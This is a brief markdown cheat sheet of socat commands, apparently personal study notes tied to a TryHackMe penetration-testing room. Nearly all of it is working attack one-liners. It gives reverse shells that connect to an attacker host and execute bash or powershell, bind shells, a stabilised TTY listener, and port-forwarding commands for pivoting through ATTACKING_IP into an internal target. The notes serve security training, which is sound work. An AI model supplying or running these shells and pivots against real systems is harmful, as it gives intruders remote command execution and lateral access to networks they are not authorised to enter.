---
title: "socat"
tags:
  - fetus
---
## rev/bind connections:
#### stable listener:
```sh
socat TCP-L:1337 FILE:`tty`,raw,echo=0
```
#### stable rev connection (linux):
```sh
socat TCP:127.0.0.1:1337 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
#### listener:
```sh
socat TCP-L:port -
```
#### reverse connection (windows):
```sh
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```
#### reverse connection (linux):
```sh
socat TCP:127.0.0.1:1337 EXEC:"bash -li"
```
#### bind listener (linux):
```sh
socat TCP-L:1337 EXEC:"bash -li"
```
#### bind listener (windows):
```sh
socat TCP-L:1337 EXEC:powershell.exe,pipes
```
#### bind connect (attacker):
```sh
socat TCP:127.0.0.1:1337 -
```
## pivoting 
- local port relay (what comes into one goes out the other basically)
```sh
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```  

- remote quiet port forwarding: 
```sh
socat tcp:ATTACKING_IP:8001 tcp:INTERNAL_TARGET_IP:TARGET_PORT,fork &
```

- we can now basically access the internal port at localhost:8000 basically. useful for internal webpages and stuff :3
	- see task 13 in https://tryhackme.com/room/wreath to see more